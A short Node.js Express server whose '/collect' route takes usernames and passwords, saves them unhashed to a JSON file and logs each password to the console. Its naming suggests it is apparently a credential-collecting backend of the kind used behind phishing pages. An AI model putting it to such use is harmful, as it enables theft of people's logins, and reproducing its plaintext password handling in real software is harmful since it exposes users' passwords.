const express = require('express');
const fs = require('fs');

const app = express();
const PORT = 8001;
const usersFile = 'users.json';

// Middleware to parse JSON bodies
app.use(express.json());

// Function to read users from the JSON file
const readUsers = () => {
    try {
        const data = fs.readFileSync(usersFile, 'utf-8');
        return JSON.parse(data);
    } catch (err) {
        // If the file doesn't exist, return an empty array
        return [];
    }
};

// Function to write users to the JSON file
const writeUsers = (users) => {
    fs.writeFileSync(usersFile, JSON.stringify(users, null, 2), 'utf-8');
};

// Route to handle login data
app.post('/collect', (req, res) => {
    const { username, password } = req.body;

    // Basic validation
    if (!username || !password) {
        return res.status(400).json({ error: 'Username and password are required.' });
    }

    // Read existing users from the file
    const users = readUsers();

    // Add new user data
    users.push({ username, password });

    // Write updated users back to the file
    writeUsers(users);

    console.log(`Received login attempt: Username - ${username}, Password - ${password}`);

    // Respond with a success message
    res.json({ message: 'Login data saved successfully!' });
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
